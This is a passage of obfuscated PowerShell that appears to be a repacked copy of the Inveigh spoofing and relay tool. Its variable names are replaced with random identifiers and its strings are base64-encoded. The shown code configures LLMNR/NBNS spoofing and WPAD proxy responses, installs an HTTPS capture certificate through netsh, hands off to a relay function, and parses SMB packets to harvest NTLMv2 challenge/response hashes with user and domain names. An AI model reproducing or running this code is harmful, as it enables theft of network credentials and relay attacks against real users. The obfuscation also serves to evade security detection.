    ${7e494e4ea1a0426ab7d62b9675e564b6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAgAE4AQgBOAFMAIABzAHAAbwBvAGYAaQBuAGcAIABpAHMAIABkAGkAcwBhAGIAbABlAGQA')))
}
if(${d70c9d958dd44a10be0c532f517e3ef9} -and (${dcac5669feaa43bda9605b66542e90eb} -eq 'y' -or ${e02740c242b24642905a7b9f9b2a7776} -eq 'y'))
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG8AbwBmAGkAbgBnACAAcgBlAHEAdQBlAHMAdABzACAAZgBvAHIAIAA='))) + ${d70c9d958dd44a10be0c532f517e3ef9} -join ",")|Out-Null
}
if(${a73d854ec3594cb5ac43e5562413d1c1} -and (${dcac5669feaa43bda9605b66542e90eb} -eq 'y' -or ${e02740c242b24642905a7b9f9b2a7776} -eq 'y'))
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBnAG4AbwByAGkAbgBnACAAcgBlAHEAdQBlAHMAdABzACAAZgBvAHIAIAA='))) + ${a73d854ec3594cb5ac43e5562413d1c1} -join ",")|Out-Null
}
if(${bd1d14dc52ab4d71ab33f77ef0ab851a} -and (${dcac5669feaa43bda9605b66542e90eb} -eq 'y' -or ${e02740c242b24642905a7b9f9b2a7776} -eq 'y'))
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG8AbwBmAGkAbgBnACAAcgBlAHEAdQBlAHMAdABzACAAZgByAG8AbQAgAA=='))) + ${bd1d14dc52ab4d71ab33f77ef0ab851a} -join ",")|Out-Null
}
if(${ab5c9a3797aa40cf86faf228516f1393} -and (${dcac5669feaa43bda9605b66542e90eb} -eq 'y' -or ${e02740c242b24642905a7b9f9b2a7776} -eq 'y'))
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBnAG4AbwByAGkAbgBnACAAcgBlAHEAdQBlAHMAdABzACAAZgByAG8AbQAgAA=='))) + ${ab5c9a3797aa40cf86faf228516f1393} -join ",")|Out-Null
}
if(${a1317be5b5a3449d9e91b8ec5e3d7e56} -eq 'n')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.spoofer_repeat = $false
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBwAG8AbwBmAGUAcgAgAFIAZQBwAGUAYQB0AGkAbgBnACAARABpAHMAYQBiAGwAZQBkAA=='))))|Out-Null
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.spoofer_repeat = $true
    ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list = @()
}
if(${b8a133e08e4b4881a9cfa933aa78c19b} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABDAGEAcAB0AHUAcgBlACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABDAGEAcAB0AHUAcgBlACAARABpAHMAYQBiAGwAZQBkAA=='))))|Out-Null
}
if(${a9712376a14345acb0046b599ac35510} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP = $true
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP = $false
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
}
if(${e55cd4a3edc2409f9544ab260c7793e4} -eq 'y')
{
    try
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS = $true
        ${925f8307b58e4f8f9c79fdb766b92b9f} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
        ${925f8307b58e4f8f9c79fdb766b92b9f}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
        ${2b05bef5311b4efd95c42dffa7b9312f} = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
        ${2b05bef5311b4efd95c42dffa7b9312f}.Import($PWD.Path + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC4AcABmAHgA'))))
        ${925f8307b58e4f8f9c79fdb766b92b9f}.Add(${2b05bef5311b4efd95c42dffa7b9312f}) 
        ${925f8307b58e4f8f9c79fdb766b92b9f}.Close()
        ${3a295f4e5f6a4ba0a0334808984f516b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBlAHIAdABoAGEAcwBoAD0A'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.certificate_thumbprint
        ${b2c7047dd89541a5a4bca6acb6894cc8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAaQBkAD0AewA='))) + ${98a67e4723ee472fa2340d2ec14a0f94}.certificate_application_ID + "}"
        ${ed973cb81c834798adb25a34885aee83} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBzAGwAYwBlAHIAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBwAHAAbwByAHQAPQAwAC4AMAAuADAALgAwADoANAA0ADMA'))),${3a295f4e5f6a4ba0a0334808984f516b},${b2c7047dd89541a5a4bca6acb6894cc8})
        & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) ${ed973cb81c834798adb25a34885aee83} > $null
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEUAbgBhAGIAbABlAGQA'))))|Out-Null
    }
    catch
    {
        ${925f8307b58e4f8f9c79fdb766b92b9f}.Close()
        ${e55cd4a3edc2409f9544ab260c7793e4}="N"
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS = $false
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAASQBuAHMAdABhAGwAbAAgAEUAcgByAG8AcgA='))))|Out-Null
    }
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEQAaQBzAGEAYgBsAGUAZAA='))))|Out-Null
}
if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP -or ${98a67e4723ee472fa2340d2ec14a0f94}.HTTPS)
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("HTTP/HTTPS Authentication = ${edc4d2f44c8e4e63b7b00dfe56110aca}")|Out-Null
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("WPAD Authentication = ${e0502cdf78554c8c80746316292c02fb}")|Out-Null
    if(${bd55bad8d04f4ca6bcf3dcf5ccc64450} -and !${a462c15526384fd8bc3d9987e501370b})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("HTTP/HTTPS Directory = ${bd55bad8d04f4ca6bcf3dcf5ccc64450}")|Out-Null
        if(${ec7a5c6fb4274258a6453827d5fed342})
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("HTTP/HTTPS Default Response File = ${ec7a5c6fb4274258a6453827d5fed342}")|Out-Null
        }
        if(${d20b2d2f2ef14e248b8925537c31c224})
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("HTTP/HTTPS Default Response Executable = ${d20b2d2f2ef14e248b8925537c31c224}")|Out-Null
        }
    }
    if(${a462c15526384fd8bc3d9987e501370b})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAvAEgAVABUAFAAUwAgAEMAdQBzAHQAbwBtACAAUgBlAHMAcABvAG4AcwBlACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
    }
    if(${edc4d2f44c8e4e63b7b00dfe56110aca} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -or ${e0502cdf78554c8c80746316292c02fb} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))))
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Basic Authentication Realm = ${aee1694b16de43f98158814241da1ee1}")|Out-Null
    }
    if(${a92483ab142f4ed2ba1088d321e8e51f} -and ${c9a4135aa8c04921b380d6390d87f594})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("WPAD = ${a92483ab142f4ed2ba1088d321e8e51f}`:${c9a4135aa8c04921b380d6390d87f594}")|Out-Null
        if(${b7db70e89e0a475da76fbc5ffcd7b001})
        {
            ForEach($WPAD_direct_host in ${b7db70e89e0a475da76fbc5ffcd7b001})
            {
                $WPAD_direct_hosts_function += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBmACAAKABkAG4AcwBEAG8AbQBhAGkAbgBJAHMAKABoAG8AcwB0ACwAIAAiAA=='))) + $WPAD_direct_host + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgApACkAIAByAGUAdAB1AHIAbgAgACIARABJAFIARQBDAFQAIgA7AA==')))
            }
            ${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AA=='))) + $WPAD_direct_hosts_function + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAHQAdQByAG4AIAAiAFAAUgBPAFgAWQAgAA=='))) + ${a92483ab142f4ed2ba1088d321e8e51f} + ":" + ${c9a4135aa8c04921b380d6390d87f594} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA7AH0A')))
            ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEQAaQByAGUAYwB0ACAASABvAHMAdABzACAAPQAgAA=='))) + ${b7db70e89e0a475da76fbc5ffcd7b001} -join ",")|Out-Null
        }
        else
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAA='))) + ${a92483ab142f4ed2ba1088d321e8e51f} + ":" + ${c9a4135aa8c04921b380d6390d87f594} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA7AH0A')))
        }
    }
    elseif(${eee8604b57284ad4b3f04f6007b25eb5} -and !${a92483ab142f4ed2ba1088d321e8e51f} -and !${c9a4135aa8c04921b380d6390d87f594})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAAgAEMAdQBzAHQAbwBtACAAUgBlAHMAcABvAG4AcwBlACAARQBuAGEAYgBsAGUAZAA='))))|Out-Null
        ${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response = ${eee8604b57284ad4b3f04f6007b25eb5}
    }
    if(${b7f8429563d14b3f96fff20409dd76ec})
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("NTLM Challenge = ${b7f8429563d14b3f96fff20409dd76ec}")|Out-Null
    }
}
if(${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'n')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBnAG4AbwByAGkAbgBnACAATQBhAGMAaABpAG4AZQAgAEEAYwBjAG8AdQBuAHQAcwA='))))|Out-Null
}
if(${d8e92100d54447b7b088ed5415a01d86} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    ${98a67e4723ee472fa2340d2ec14a0f94}.console_output = $true
}
else
{
    if(${98a67e4723ee472fa2340d2ec14a0f94}.tool -eq 1)
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA='))))|Out-Null
    }
    else
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
    }
}
if(${b2eefd58abcb4861a36bf6a0ff6b0a34} -eq 'y')
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Output Directory = ${7cf71f7093ec4285942d4f29ad2e193e}")|Out-Null
    ${98a67e4723ee472fa2340d2ec14a0f94}.file_output = $true
}
else
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
}
if(${e1ee1c6aeb484ee2af1947e459200566} -eq 1)
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Run Time = ${e1ee1c6aeb484ee2af1947e459200566} Minute")|Out-Null
}
elseif(${e1ee1c6aeb484ee2af1947e459200566} -gt 1)
{
    ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add("Run Time = ${e1ee1c6aeb484ee2af1947e459200566} Minutes")|Out-Null
}
if(${db77efe80dee43d796b1ffc2102b7549} -eq 'n')
{
    if(${af68946a97ec4589b2fac87862a490ac} -eq 'y')
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAtAE4AbwB1AG4AIABJAG4AdgBlAGkAZwBoACoAIAB0AG8AIABzAGgAbwB3ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABmAHUAbgBjAHQAaQBvAG4AcwA='))))|Out-Null
        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIABJAG4AdgBlAGkAZwBoAA=='))))|Out-Null
        if(${98a67e4723ee472fa2340d2ec14a0f94}.console_output)
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA='))))|Out-Null
        }
    }
    if(${98a67e4723ee472fa2340d2ec14a0f94}.status_output)
    {
        while(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.Count -gt 0)
        {
            if(${98a67e4723ee472fa2340d2ec14a0f94}.output_stream_only)
            {
                write-output(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0] + ${98a67e4723ee472fa2340d2ec14a0f94}.newline)
                ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch (${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIABJAG4AdgBlAGkAZwBoAA==')))
                    {
                        write-warning(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0])
                        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output(${98a67e4723ee472fa2340d2ec14a0f94}.status_queue[0])
                        ${98a67e4723ee472fa2340d2ec14a0f94}.status_queue.RemoveRange(0,1)
                    }
                }
            }
        }
    }
}
else
{
    Invoke-InveighRelay -HTTP ${a9712376a14345acb0046b599ac35510} -HTTPS ${e55cd4a3edc2409f9544ab260c7793e4} -HTTPSCertAppID ${dc32fcaed6224d1588a53e6f2bc8a76f} -HTTPSCertThumbprint ${d3e4b31d632c4e23918a42b78b0c2605} -WPADAuth ${e0502cdf78554c8c80746316292c02fb} -SMBRelayTarget ${c528a2182bb047f79bcfe29c2916df12} -SMBRelayUsernames ${a85dc65b1229497dbdd4fc6a88a3775c} -SMBRelayAutoDisable ${d13b898c18954d6ba46625e1ae98c5ee} -SMBRelayNetworkTimeout ${e6abfec0dea646f69b1a2c989ebdcdbb} -MachineAccounts ${d4dc92f8b9e04a91be5eb7099818dc83} -SMBRelayCommand ${aed8122c078d4b3fae5f8b6517ed3f70} -Tool ${aba1f06cc6764377a7b6ab2ceccdaec9} -ShowHelp ${af68946a97ec4589b2fac87862a490ac} 
}
${a2be443c2a404f3b8dbfa3056d80388e} =
{
    Function DataToUInt16(${daa607e434f64a74adfe8ea22b8d2230})
    {
	   [Array]::Reverse(${daa607e434f64a74adfe8ea22b8d2230})
	   return [BitConverter]::ToUInt16(${daa607e434f64a74adfe8ea22b8d2230},0)
    }
    Function DataToUInt32(${daa607e434f64a74adfe8ea22b8d2230})
    {
	   [Array]::Reverse(${daa607e434f64a74adfe8ea22b8d2230})
	   return [BitConverter]::ToUInt32(${daa607e434f64a74adfe8ea22b8d2230},0)
    }
    Function DataLength
    {
        param ([int]${b858a3a79f3b4855a4429e7b40c8605c},[byte[]]${b46ab1deac9d4f5c99a13e6bc577641f})
        ${cd194113a12340b7bba410e066f90eac} = [System.BitConverter]::ToInt16(${b46ab1deac9d4f5c99a13e6bc577641f}[${b858a3a79f3b4855a4429e7b40c8605c}..(${b858a3a79f3b4855a4429e7b40c8605c} + 1)],0)
        return ${cd194113a12340b7bba410e066f90eac}
    }
    Function DataToString
    {
        param ([int]${cd194113a12340b7bba410e066f90eac},[int]${dcb76819babc456da703ca230b676b5a},[int]${d79f6fda5e9f4725b4226f945bc82194},[int]${a92f5ca0afe64fe185d8653ddc5e6484},[byte[]]${b46ab1deac9d4f5c99a13e6bc577641f})
        ${786795fd276044caadcb169c85506002} = [System.BitConverter]::ToString(${b46ab1deac9d4f5c99a13e6bc577641f}[(${a92f5ca0afe64fe185d8653ddc5e6484}+${dcb76819babc456da703ca230b676b5a}+${d79f6fda5e9f4725b4226f945bc82194})..(${a92f5ca0afe64fe185d8653ddc5e6484}+${cd194113a12340b7bba410e066f90eac}+${dcb76819babc456da703ca230b676b5a}+${d79f6fda5e9f4725b4226f945bc82194}-1)])
        ${786795fd276044caadcb169c85506002} = ${786795fd276044caadcb169c85506002} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${786795fd276044caadcb169c85506002} = ${786795fd276044caadcb169c85506002}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${a4abb6bee1894021b1f45e9b540268a4} = New-Object System.String (${786795fd276044caadcb169c85506002},0,${786795fd276044caadcb169c85506002}.Length)
        return ${a4abb6bee1894021b1f45e9b540268a4}
    }
}
${3955e5e75bf14bbc8d661d8fbbe37646} =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]${c08eba43cd9e4925b5273004b82623c5})
        ${7eb094eb91f74789b5cd9ff7f01b3293} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5})
        ${7eb094eb91f74789b5cd9ff7f01b3293} = ${7eb094eb91f74789b5cd9ff7f01b3293} -replace "-",""
        ${cd72e06fd9674f9998b564a34130e7f6} = ${7eb094eb91f74789b5cd9ff7f01b3293}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${7eb094eb91f74789b5cd9ff7f01b3293}.SubString((${cd72e06fd9674f9998b564a34130e7f6} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
        {
            ${0bd5ba00bfd54a85948d76bfd4b4ef11} = ${7eb094eb91f74789b5cd9ff7f01b3293}.SubString((${cd72e06fd9674f9998b564a34130e7f6} + 48),16)
        }
        return ${0bd5ba00bfd54a85948d76bfd4b4ef11}
    }
    Function SMBNTLMResponse
    {
        param ([byte[]]${c08eba43cd9e4925b5273004b82623c5})
        ${7eb094eb91f74789b5cd9ff7f01b3293} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5})
        ${7eb094eb91f74789b5cd9ff7f01b3293} = ${7eb094eb91f74789b5cd9ff7f01b3293} -replace "-",""
        ${cd72e06fd9674f9998b564a34130e7f6} = ${7eb094eb91f74789b5cd9ff7f01b3293}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        ${c1a6a06fee624beea797a15ad4383879} = ${cd72e06fd9674f9998b564a34130e7f6} / 2
        if(${7eb094eb91f74789b5cd9ff7f01b3293}.SubString((${cd72e06fd9674f9998b564a34130e7f6} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzADAAMAAwADAAMAAwAA=='))))
        {
            ${9a60ae57ebd2422d993b382b10fc891b} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 12) ${c08eba43cd9e4925b5273004b82623c5}
            ${bb60c02c27aa4f778f19226f0b84ee07} = ${c08eba43cd9e4925b5273004b82623c5}[(${c1a6a06fee624beea797a15ad4383879} + 16)]
            if(${9a60ae57ebd2422d993b382b10fc891b} -ge 24)
            {
                ${2dac9a8b9d0148a7b3d9008c3ecf7514} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 20) ${c08eba43cd9e4925b5273004b82623c5}
                ${ee615ccabf374865be046a479a630732} = ${c08eba43cd9e4925b5273004b82623c5}[(${c1a6a06fee624beea797a15ad4383879} + 24)]
                ${c39c7b8b5c8e44168fcd0c13522799f8} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 28) ${c08eba43cd9e4925b5273004b82623c5}
                ${d6bfe0ae772b4e5aad315d72c667dbbb} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 32) ${c08eba43cd9e4925b5273004b82623c5}
                ${f183eb3cd96c4a66ab9e36d3725e3789} = DataToString ${c39c7b8b5c8e44168fcd0c13522799f8} 0 0 (${c1a6a06fee624beea797a15ad4383879} + ${d6bfe0ae772b4e5aad315d72c667dbbb}) ${c08eba43cd9e4925b5273004b82623c5}
                ${77456aac9112496a8d399e6ca508a2e6} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 36) ${c08eba43cd9e4925b5273004b82623c5}
                ${5c77816d70fb4f3c9b4c1646cf38d6bf} = DataToString ${77456aac9112496a8d399e6ca508a2e6} ${c39c7b8b5c8e44168fcd0c13522799f8} 0 (${c1a6a06fee624beea797a15ad4383879} + ${d6bfe0ae772b4e5aad315d72c667dbbb}) ${c08eba43cd9e4925b5273004b82623c5}
                ${9413a0907cd24603ba770f193a99eea1} = DataLength (${c1a6a06fee624beea797a15ad4383879} + 44) ${c08eba43cd9e4925b5273004b82623c5}
                ${43cf8e406e0f41ef86318fa596905f39} = DataToString ${9413a0907cd24603ba770f193a99eea1} ${77456aac9112496a8d399e6ca508a2e6} ${c39c7b8b5c8e44168fcd0c13522799f8} (${c1a6a06fee624beea797a15ad4383879} + ${d6bfe0ae772b4e5aad315d72c667dbbb}) ${c08eba43cd9e4925b5273004b82623c5}
                if(([BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[(${c1a6a06fee624beea797a15ad4383879} + ${bb60c02c27aa4f778f19226f0b84ee07})..(${c1a6a06fee624beea797a15ad4383879} + ${bb60c02c27aa4f778f19226f0b84ee07} + ${9a60ae57ebd2422d993b382b10fc891b} - 1)]) -replace "-","") -eq ("00" * ${9a60ae57ebd2422d993b382b10fc891b}))
                {
                    ${c24a075303f747d09d6a8c01678e2ed4} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[(${c1a6a06fee624beea797a15ad4383879} + ${ee615ccabf374865be046a479a630732})..(${c1a6a06fee624beea797a15ad4383879} + ${ee615ccabf374865be046a479a630732} + ${2dac9a8b9d0148a7b3d9008c3ecf7514} - 1)]) -replace "-",""
                    ${c24a075303f747d09d6a8c01678e2ed4} = ${c24a075303f747d09d6a8c01678e2ed4}.Insert(32,':')
                    ${71286460d4c645fab082423ef14bd62d} = ${5c77816d70fb4f3c9b4c1646cf38d6bf} + "::" + ${f183eb3cd96c4a66ab9e36d3725e3789} + ":" + ${0bd5ba00bfd54a85948d76bfd4b4ef11} + ":" + ${c24a075303f747d09d6a8c01678e2ed4}
                    if((${2940dc5f22dc4ba18210d4acc5b9ff8f} -ne ${abd19e74908a450e847564f92e2000eb}) -and ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'y') -or ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'n') -and (-not ${5c77816d70fb4f3c9b4c1646cf38d6bf}.EndsWith('$')))))
                    {      
                        ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response for ${f183eb3cd96c4a66ab9e36d3725e3789}\${5c77816d70fb4f3c9b4c1646cf38d6bf} captured from ${2940dc5f22dc4ba18210d4acc5b9ff8f}(${43cf8e406e0f41ef86318fa596905f39})")])   
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue.add(${71286460d4c645fab082423ef14bd62d})
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list.add(${71286460d4c645fab082423ef14bd62d})
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - SMB NTLMv2 challenge/response captured from ${2940dc5f22dc4ba18210d4acc5b9ff8f}(${43cf8e406e0f41ef86318fa596905f39}):`n${71286460d4c645fab082423ef14bd62d}")
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABOAFQATABNAHYAMgAgAGMAaABhAGwAbABlAG4AZwBlAC8AcgBlAHMAcABvAG4AcwBlACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAA=='))) + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_out_file)
                        }
                    }
                }
                else
                {
                    ${16d95bc536294b25bb44a9552e896bfd} = [System.BitConverter]::ToString(${c08eba43cd9e4925b5273004b82623c5}[(${c1a6a06fee624beea797a15ad4383879} + ${bb60c02c27aa4f778f19226f0b84ee07})..(${c1a6a06fee624beea797a15ad4383879} + ${bb60c02c27aa4f778f19226f0b84ee07} + ${2dac9a8b9d0148a7b3d9008c3ecf7514} + ${9a60ae57ebd2422d993b382b10fc891b} - 1)]) -replace "-",""
